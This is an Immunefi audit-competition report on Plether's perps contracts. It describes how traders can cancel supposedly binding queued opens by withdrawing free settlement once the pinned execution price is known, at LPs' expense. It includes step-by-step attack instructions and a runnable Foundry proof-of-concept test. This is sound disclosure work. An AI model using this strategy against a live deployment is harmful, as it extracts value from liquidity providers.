# \#98185 [SC-Low] Binding queued opens can be killed after the execution price is known, giving traders a near-free option against LPs

**Submitted on Nov 5th 2026 at 19:41:48 UTC by @empuras for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98185
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro

The Router treats queued orders as binding. `SECURITY.md` lists as a security property that:

> binding order semantics and the lack of a user cancellation path prevent traders from turning queued intents into
> free options

and that "users cannot cancel a queued intent".

Execution prices are pinned to the first Pyth tick after `commitTime`
(`PletherOracle._resolveHistoricalOrderBasket`, `parsePriceFeedUpdatesUnique(..., commitTime + 1, ...)`).

However, whether a queued open **succeeds** can be made to depend on a small slice of the trader's *free settlement*.
That slice stays withdrawable after commit. The trader can therefore:

1. commit an open,
2. wait until its pinned execution tick is public,
3. watch the market move after that tick, and then either:
   - leave the free slice in place, so the order fills at the stale pinned price, or
   - withdraw the slice, so the order fails terminally with `INSUFFICIENT_INITIAL_MARGIN` (category `UserInvalid`).

A failed open costs only the open execution bounty. That bounty is capped at `maxOpenOrderExecutionBountyAssets = 200_000`
(0.20 USDG) regardless of size, and it is refunded entirely when the trader is the executor. This is a de-facto
cancellation path, and it turns queued opens into the free option that the security model says cannot exist.

## Vulnerability Details

All references are to commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, under `packages/perps/src/`.

### 1. Open success can depend on withdrawable free settlement

When an open earns a VPI rebate (it reduces skew), the planner credits the rebate net of the execution fee to free
settlement (`MarginClearinghouseAccountingLib.planOpenCostApplication`, lines 148-149). It then funds the new
negative-VPI reserve **from free settlement first**, and only the shortfall from the order's new pledge
(`CfdEnginePlanLib._planOpenReserveFunding`, lines 546-580, especially 564-567):

```solidity
uint256 vpiReserveFromFreeAssets = vpiReserveIncreaseAssets < openCostPlan.resultingFreeSettlementAssets
    ? vpiReserveIncreaseAssets
    : openCostPlan.resultingFreeSettlementAssets;
delta.vpiRebateReserveFromPledgeAssets = vpiReserveIncreaseAssets - vpiReserveFromFreeAssets;
...
delta.positionMarginAfterOpen =
    openCostPlan.resultingPositionMarginAssets - delta.vpiRebateReserveFromPledgeAssets - reserveIncreaseAssets;
```

Let `V` be the rebate and `f` the execution fee. With `V >= f`, the rebate credit is only `V - f`. The reserve
therefore needs `f` of *pre-existing* free settlement, otherwise `f` is taken from the new pledge.

If `marginDelta` is chosen as initial margin plus liquidation reserve plus a buffer smaller than `f`, two outcomes
follow:

- When the trader keeps `f` free, `positionMarginAfterOpen` stays above initial margin and the order executes.
- When the trader withdraws `f`, `positionMarginAfterOpen` drops below initial margin and the planner returns
  `INSUFFICIENT_INITIAL_MARGIN` (`CfdEnginePlanLib` line 435).

The same dependency exists for increases on an existing position. The PoC demonstrates this as well (`test_increaseAbortCostsOnlyBounty`).

### 2. Nothing protects that free slice after commit

`CfdEngineSettlementSidecar.validateWithdraw` (lines 255-285) treats the two kinds of account differently:

- **Flat accounts:** the only protection is the optional settlement floor (`if (minimum != 0)`, line 264). The trader
  sets that floor in the request, and it defaults to zero.
- **Accounts with a position:** only position health is checked (pledge plus claim against margin). Free settlement
  is never checked against pending opens.

`OrderLiquidationBatchLogic._validateFreshRequest` allows a floor only for flat accounts with no other pending order
(lines 307-311). So nothing stops a position holder from withdrawing. The PoC shows that a position holder who tries to opt into
the floor is rejected with `OrderRouter__SettlementFloorUnsupported` (`test_increaseCannotOptIntoSettlementFloor`).

### 3. The failure is terminal, keeps the pinned price private to the trader, and is cheap

- The commit-time preview passes because the free slice is present at commit
  (`OrderLiquidationBatchLogic._validatedOpenBounty`, lines 431-445). `INSUFFICIENT_INITIAL_MARGIN` is only rejected at
  commit when the preview predicts it.
- At execution, every open failure other than degraded mode, skew, solvency and numeric errors is classified as
  `UserInvalid`, which is terminal (`CfdEnginePlanLib.getExecutionFailurePolicyCategory`, lines 112-128). The order is
  finalized as `Failed` and its committed margin is returned.
- The bounty is `notional * 1 bps`, clamped to `[0.01, 0.20]` USDG (`OrderRouterBase` lines 72-74). On a self-executed
  failure it is released back to the trader (`OrderRouter._settleTerminalBounty`, lines 336-337).

### 4. Why this is an option on the market

The execution price is fixed before the trader has to decide: it is the first tick after commit, which is public
about one second after commit. The trader then observes the live basket and decides whether to let the order fill:

- If the market has moved in the position's favour, keeping the slice means opening at the stale, better price and
  locking in that move.
- If the market has moved against the position, withdrawing the slice voids the trade for at most 0.20 USDG.

The order can be executed at its pinned price until `executionDeadline`, for up to `maxExecutionWindowSeconds`
(60 s by default). Keepers are untrusted, and the protocol cannot force prompt execution.

## Impact Details

The expected value of a binding order, before fees, is zero. With the abort lever it becomes
`E[max(0, ΔP)] * notional`, minus fees on filled trades only. Here `ΔP` is the basket move between the pinned tick and
the moment of execution, signed in the position's favour. LPs pay this difference.

PoC numbers, using release parameters (`DEPLOYMENT.md`): `vpiFactor 0.01e18`, `executionFeeBps 4`,
`init/maint 20/10 bps`, `maxSkewRatio 0.4e18`, open bounty capped at 0.20 USDG. The scenario is a $1M pool, an existing
$300k long skew, and a $100k short open, with a 15 bps move after the pinned tick:

| Branch | Trader result |
| --- | --- |
| Market moves in favour; the trader keeps the free slice; the order fills at the pinned tick | **+68.93 USDG** |
| Market moves against; the trader withdraws 40 USDG; the order fails terminally | **−0.20 USDG** |
| Same adverse move if the order were truly binding (counterfactual) | −230.14 USDG |

For symmetric ±15 bps moves, the trader's expected value per round is **+34.4 USDG** with the abort lever, against
**−80.6 USDG** if the order were binding. That is a transfer of about 115 USDG per $100k notional per round from LPs.

Scale:

- The edge grows linearly with notional. Per-order size is bounded only by the skew cap (`0.4 × depth`).
- The premium does not grow, because the bounty cap of 0.20 USDG is fixed.
- The trader can repeat the strategy on every rebate-earning open, and on increases of an existing position, which
  cannot use the floor at all. The PoC kills a $100k increase on a live $100k short for 0.200015 USDG: the capped
  bounty plus 15 atoms of carry that the position owed anyway.

Break-even: the move after the pinned tick must exceed roughly twice the 4 bps fee, plus the adverse confidence shift
(at most 2.5 bps per side under release oracle parameters). Moves of this size within seconds are routine around FX
data releases. They are also likely during any window in which keepers are slow, which is a realistic condition given
that keepers are permissionless and untrusted.

### Severity rationale

Proposed: **High — Theft of unclaimed yield** (LP trading revenue in `HousePool` is transferred to the trader).

Rationale and limits, stated up front:

- The trader gets a call-like option on every rebate-earning open, for a premium of at most 0.20 USDG. This holds for
  any notional, and the premium is zero when the trader executes the order themselves.
- The extracted value comes from `HousePool` LPs, who are the counterparty to every trader PnL.
- The edge per trade depends on how far the basket moves between the pinned execution tick and the first keeper
  execution. In quiet FX markets this is small. Around data releases, or whenever execution is slow (the default
  execution window is 60 s), it exceeds the 4 bps fee by a wide margin.
- The strategy never does worse than honest trading. If a keeper executes before the trader decides, the order simply
  fills as normal.

## Why this is not a known issue

- **Not the "Arbitrum and Pyth clock alignment" limitation (HIGH-1).** That issue is about a qualifying tick possibly
  being known *at* commit. This report needs no clock mismatch: the tick can be entirely unknown at commit. The advantage
  comes from deciding *after* the tick whether the order executes at all. Fixing clock alignment does not fix this.
- **Not "live basket component selection".** That limitation concerns live marks, liquidation and epoch settlement.
  Historical order execution is explicitly excluded from it.
- **It contradicts a stated security property.** `SECURITY.md` lines 658-659 say binding orders and the lack of user
  cancellation *prevent* free options, and line 719 says users cannot cancel a queued intent. This report shows a
  user-controlled cancellation path through ordinary `withdraw`, costing at most 0.20 USDG.
- **The settlement floor does not close it.** The floor (`minPostSettlementBalanceAssets`) is an opt-in field set by the
  trader, so the attacker simply leaves it at zero. For accounts with a position it cannot be set at all; the PoC
  shows the commit reverting with `OrderRouter__SettlementFloorUnsupported`.

## Recommendation

Make the success of a queued open depend only on value that is locked at commit:

1. **Fund the negative-VPI reserve from the order's own rebate and committed margin before free settlement.** Never
   rely on pre-existing free settlement that can be withdrawn. Alternatively, at commit, reserve the worst-case
   free-settlement draw of the open (fee plus VPI-reserve shortfall) as part of the order reservation.
2. **Or block withdrawals that turn a pending open from executable into failing.** Re-run the pending open's preview
   in `validateWithdraw` for every account with a pending open, not only flat accounts that opted into a floor.
3. **Defence in depth:** make a trader-caused terminal open failure cost a notional-proportional penalty paid to LPs,
   instead of a bounty capped at 0.20 USDG that is refunded on self-execution.

## References

All links are pinned to the audited commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.

- `packages/perps/SECURITY.md` [L658-659](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L658-L659), [L719](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L719) — stated binding-order / no-cancellation property
- `packages/perps/WHITEPAPER.md` [L1137](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L1137) — binding orders and compensating controls
- `packages/perps/src/libraries/CfdEnginePlanLib.sol` [L345-380](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L345-L380), [L435](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L435), [L546-580](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L546-L580), [L112-128](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L112-L128) — open planning, initial-margin failure, `_planOpenReserveFunding` (free settlement drawn first), failure categories
- `packages/perps/src/libraries/MarginClearinghouseAccountingLib.sol` [L139-187](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/MarginClearinghouseAccountingLib.sol#L139-L187) — `planOpenCostApplication`
- `packages/perps/src/CfdEngineSettlementSidecar.sol` [L255-285](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L255-L285) — `validateWithdraw`
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol` [L259-266](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L259-L266), [L304-311](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L304-L311), [L431-445](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L431-L445) — opt-in floor (flat accounts only), commit-time preview
- `packages/perps/src/OrderRouterExecutionSidecar.sol` [L498](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L498) — order margin released to free settlement before planning
- `packages/perps/src/OrderRouter.sol` [L336-337](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L336-L337) — bounty refunded on self-execution
- `packages/perps/src/router/OrderRouterBase.sol` [L72-74](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderRouterBase.sol#L72-L74) — open bounty 1 bps, capped at 0.20 USDG
- `packages/perps/src/PletherOracle.sol` [L610-614](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L610-L614) — execution price pinned to the first tick after commit


## Proof of Concept

## Proof of Concept

### Attack steps

1. The market is long-skewed (an existing $300k long on a $1M pool), so a short open reduces skew and earns a VPI
   rebate.
2. The attacker deposits 360.20 USDG and commits a $100k `SHORT` open with `marginDelta = 320 USDG` (20 bps initial
   margin + 10 bps liquidation reserve + half the 40 USDG fee). The remaining 40 USDG stays as free settlement, and the
   commit-time preview passes because that slice is present.
3. The execution price is pinned to the first Pyth tick after `commitTime`, which is public about one second later.
   The attacker watches the live basket.
4. **Adverse move:** the attacker calls `MarginClearinghouse.withdraw(attacker, 40e6)`. Nothing checks the pending
   open. When any keeper executes, the planner draws the VPI reserve from the pledge instead, initial margin is no
   longer met, and the order fails terminally (`UserInvalid`, `INSUFFICIENT_INITIAL_MARGIN`). Committed margin is
   returned; the only cost is the 0.20 USDG bounty (zero if the attacker executes it).
5. **Favourable move:** the attacker does nothing. The order fills at the stale pinned price and the attacker realizes
   the move.
6. The same lever works on an increase of an existing position, where the settlement floor cannot be set at all.

### Runnable Foundry test

Save the file below as `packages/perps/test/audit/QueuedOpenAbortOption.t.sol` and run:

```bash
forge test --root packages/perps --match-path test/audit/QueuedOpenAbortOption.t.sol -vv
```

Expected output:

```text
[PASS] test_abortAfterTickCostsOnlyBounty()
  abort cost (USDG): 0.200000
[PASS] test_bindingCounterfactualLoses()
  binding adverse PnL (USDG): -230.140015
[PASS] test_increaseAbortCostsOnlyBounty()
  increase abort cost (USDG): 0.200015
[PASS] test_increaseCannotOptIntoSettlementFloor()
[PASS] test_increaseKeptFills()
[PASS] test_keptOrderFillsAtPinnedTick()
  kept branch PnL (USDG): 68.929011
```

What each test shows:

| Test | Account | Shows |
| --- | --- | --- |
| `test_abortAfterTickCostsOnlyBounty` | flat | Withdrawing the 40 USDG fee slice after the tick kills a $100k open for 0.20 USDG |
| `test_keptOrderFillsAtPinnedTick` | flat | The same order, kept, fills at the pinned tick and realizes a 15 bps move (+68.93 USDG) |
| `test_bindingCounterfactualLoses` | flat | What the adverse branch would cost if the order were binding (−230.14 USDG) |
| `test_increaseCannotOptIntoSettlementFloor` | live position | A position holder cannot set the settlement floor at all |
| `test_increaseAbortCostsOnlyBounty` | live position | The same lever kills a queued increase; the live position is untouched |
| `test_increaseKeptFills` | live position | Control: with the fee slice in place, the identical increase fills |

The PoC uses only public entrypoints: `OrderRouter.commitOrder`, `MarginClearinghouse.withdraw` and
`OrderRouter.executeOrder`, called by an unprivileged keeper. It uses release risk parameters and modifies no in-scope
contract. Pyth and USDG are the repository's mocks. A `-vvvv` trace of both abort branches (fresh open and increase) shows the terminal failure
`CfdEngine__TypedOrderFailure(UserInvalid, 6 = INSUFFICIENT_INITIAL_MARGIN)` with the bounty paid to the keeper.

Note: in this protocol a `SHORT` gains when the basket rises (`CfdMath` max profit for `SHORT` is `lots*cap − entry`).

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";

/// @notice Audit PoC: a queued open that earns a VPI rebate can be sized so its execution depends on a fee-sized slice
///         of free settlement. That slice stays withdrawable after commit, so the trader keeps or kills the "binding"
///         order after its execution tick is public and pays at most the capped open bounty for killing it.
/// @dev Public entrypoints only (commitOrder, clearinghouse.withdraw, executeOrder). Release risk parameters.
contract QueuedOpenAbortOption is BasePerpTest {

    address internal constant SKEWER = address(0x5E3E);
    address internal constant ATTACKER = address(0xA77);
    address internal constant KEEPER = address(0x4EE9);

    uint256 internal constant PRICE = 1e8;
    // $300k long leaves the market long-heavy, so a short open reduces skew and earns a VPI rebate.
    uint256 internal constant SKEW_SIZE = 300_000e18;
    uint256 internal constant ATTACK_SIZE = 100_000e18;
    // 4 bps execution fee on $100k.
    uint256 internal constant FEE = 40e6;
    // 20 bps initial margin + 10 bps liquidation reserve + half the fee: enough only while the fee stays free-funded.
    uint256 internal constant ATTACK_MARGIN = 320e6;
    // Market move after the pinned execution tick, before a keeper executes.
    uint256 internal constant MOVE_BPS = 15;
    // Doubling the short: total 20 bps initial margin ($400) needs existing pledge ($220) + 280; the extra 10 bps
    // liquidation reserve ($100) and the fee-sized VPI-reserve draw ($40) leave 300 just short unless the fee is free.
    uint256 internal constant INCREASE_MARGIN = 300e6;

    uint64 internal attackId;
    uint256 internal bounty;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        assertFalse(engine.isFadWindow(), "fixture must start outside FAD");
        assertFalse(engine.isOracleFrozen(), "fixture must start live");

        _fundTrader(SKEWER, 20_000e6);
        uint64 skewId = _commit(SKEWER, CfdTypes.Side.LONG, false, SKEW_SIZE, 10_000e6);
        assertEq(uint8(_execute(skewId, PRICE)), uint8(OrderV3Types.LifecycleStatus.Executed), "skew open");

        bounty = router.maxOpenOrderExecutionBountyAssets();
        _fundTrader(ATTACKER, ATTACK_MARGIN + FEE + bounty);
        attackId = _commit(ATTACKER, CfdTypes.Side.SHORT, false, ATTACK_SIZE, ATTACK_MARGIN);
        assertEq(clearinghouse.getFreeBuyingPowerAssets(ATTACKER), FEE, "only the fee slice stays free");
        // The first tick after commit is now public; the trader watches the market for a few more seconds.
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
    }

    /// @dev Market fell after the pinned tick (SHORT gains when the basket rises), so the short would open underwater.
    ///      Withdrawing the free fee slice makes the queued open fail terminally at its pinned price; the trader's only
    ///      cost is the capped bounty.
    function test_abortAfterTickCostsOnlyBounty() public {
        uint256 before = _attackerValue();
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, FEE);

        assertEq(uint8(_execute(attackId, PRICE)), uint8(OrderV3Types.LifecycleStatus.Failed), "open killed");
        (uint256 size,,,,,,) = engine.positions(ATTACKER);
        assertEq(size, 0, "no exposure taken");
        assertEq(before - _attackerValue(), bounty, "abort costs exactly the capped bounty");
        emit log_named_decimal_uint("abort cost (USDG)", before - _attackerValue(), 6);
    }

    /// @dev Market rose after the pinned tick. Keeping the fee slice lets the same order fill at the stale tick, and the
    ///      trader realizes the move on close.
    function test_keptOrderFillsAtPinnedTick() public {
        uint256 before = _attackerValue();
        int256 pnl = _fillAndClose(PRICE * (10_000 + MOVE_BPS) / 10_000);
        assertGt(pnl, 0, "favorable branch profits");
        assertEq(int256(_attackerValue()) - int256(before), pnl);
        emit log_named_decimal_int("kept branch PnL (USDG)", pnl, 6);
    }

    /// @dev What a truly binding order would cost in the adverse branch the abort avoided.
    function test_bindingCounterfactualLoses() public {
        int256 pnl = _fillAndClose(PRICE * (10_000 - MOVE_BPS) / 10_000);
        assertLt(pnl, -int256(bounty) * 100, "binding adverse branch loses far more than the bounty");
        emit log_named_decimal_int("binding adverse PnL (USDG)", pnl, 6);
    }

    /// @dev Position holders cannot even opt into the settlement floor that guards flat accounts' pending opens.
    function test_increaseCannotOptIntoSettlementFloor() public {
        _openAttackPosition();
        _fundTrader(ATTACKER, INCREASE_MARGIN + FEE + bounty);
        OrderV3Types.OrderRequest memory request =
            _request(CfdTypes.Side.SHORT, false, ATTACK_SIZE, INCREASE_MARGIN);
        request.bounds.minPostSettlementBalanceAssets = 1;
        request.bounds.maxGrossAccountDebitAssets = FEE + bounty;
        vm.expectRevert(IOrderRouterErrors.OrderRouter__SettlementFloorUnsupported.selector);
        vm.prank(ATTACKER);
        router.commitOrder(request);
    }

    /// @dev Same lever on an existing position: the trader withdraws the free fee slice after the increase's tick is
    ///      public, the queued increase fails terminally, and the live position is untouched.
    function test_increaseAbortCostsOnlyBounty() public {
        uint64 increaseId = _commitIncrease();
        (uint256 sizeBefore,,,,,,) = engine.positions(ATTACKER);
        uint256 before = _attackerValue();
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, FEE);

        assertEq(uint8(_execute(increaseId, PRICE)), uint8(OrderV3Types.LifecycleStatus.Failed), "increase killed");
        (uint256 sizeAfter,,,,,,) = engine.positions(ATTACKER);
        assertEq(sizeAfter, sizeBefore, "position unchanged");
        // Besides the bounty, only the live position's few seconds of carry (owed anyway) are realized on withdraw.
        assertApproxEqAbs(before - _attackerValue(), bounty, 100, "abort costs the capped bounty plus dust carry");
        emit log_named_decimal_uint("increase abort cost (USDG)", before - _attackerValue(), 6);
    }

    /// @dev Control: leaving the fee slice in place, the identical queued increase fills.
    function test_increaseKeptFills() public {
        uint64 increaseId = _commitIncrease();
        assertEq(uint8(_execute(increaseId, PRICE)), uint8(OrderV3Types.LifecycleStatus.Executed), "increase fills");
        (uint256 size,,,,,,) = engine.positions(ATTACKER);
        assertEq(size, 2 * ATTACK_SIZE);
    }

    function _openAttackPosition() internal {
        assertEq(uint8(_execute(attackId, PRICE)), uint8(OrderV3Types.LifecycleStatus.Executed), "first open");
        assertEq(clearinghouse.getFreeBuyingPowerAssets(ATTACKER), 0, "no free settlement after the first open");
    }

    function _commitIncrease() internal returns (uint64 increaseId) {
        _openAttackPosition();
        _fundTrader(ATTACKER, INCREASE_MARGIN + FEE + bounty);
        // Still reduces the long skew, so the increase also earns a VPI rebate.
        increaseId = _commit(ATTACKER, CfdTypes.Side.SHORT, false, ATTACK_SIZE, INCREASE_MARGIN);
        assertEq(clearinghouse.getFreeBuyingPowerAssets(ATTACKER), FEE, "only the fee slice stays free");
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _fillAndClose(
        uint256 closePrice
    ) internal returns (int256 pnl) {
        uint256 before = _attackerValue();
        assertEq(uint8(_execute(attackId, PRICE)), uint8(OrderV3Types.LifecycleStatus.Executed), "open fills");
        (uint256 size,,,,,,) = engine.positions(ATTACKER);
        assertEq(size, ATTACK_SIZE);

        uint64 closeId = _commit(ATTACKER, CfdTypes.Side.SHORT, true, ATTACK_SIZE, 0);
        assertEq(uint8(_execute(closeId, closePrice)), uint8(OrderV3Types.LifecycleStatus.Executed), "close fills");
        (size,,,,,,) = engine.positions(ATTACKER);
        assertEq(size, 0);
        pnl = int256(_attackerValue()) - int256(before);
    }

    function _attackerValue() internal view returns (uint256) {
        return clearinghouse.balanceAssets(ATTACKER) + settlementToken.balanceOf(ATTACKER);
    }

    function _commit(
        address account,
        CfdTypes.Side side,
        bool close,
        uint256 size,
        uint256 margin
    ) internal returns (uint64 id) {
        OrderV3Types.OrderRequest memory request = _request(side, close, size, margin);
        vm.prank(account);
        id = router.commitOrder(request);
    }

    function _request(
        CfdTypes.Side side,
        bool close,
        uint256 size,
        uint256 margin
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = keccak256(abi.encode("abort-option", router.nextCommitId()));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.isClose = close;
        request.targetPrice = (side == CfdTypes.Side.LONG) == close ? 2e8 : 1;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _execute(
        uint64 id,
        uint256 price
    ) internal returns (OrderV3Types.LifecycleStatus) {
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        return router.executeOrder(id, data).status;
    }

}
```

